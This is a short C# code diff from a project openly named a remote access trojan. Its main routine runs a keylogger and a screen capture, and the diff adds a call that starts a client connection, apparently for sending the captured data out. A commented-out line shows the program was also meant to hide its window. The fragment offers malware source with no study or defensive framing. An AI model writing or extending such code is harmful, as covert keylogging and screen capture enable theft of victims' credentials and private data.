@@ -14,9 +14,13 @@ namespace remote_access_trojan
             //ShowWindow(handle, SW_HIDE);
 
             Console.WriteLine("Hello World!");
+            //Client.ExecuteClient();
+
 
             Keylogger.Run();
             Screenshot.takeScreenshot();
+           // Client.ZipFiles();
+            Client.newClient();
 
             // Do not move - this needs to be the last line
             Application.Run();
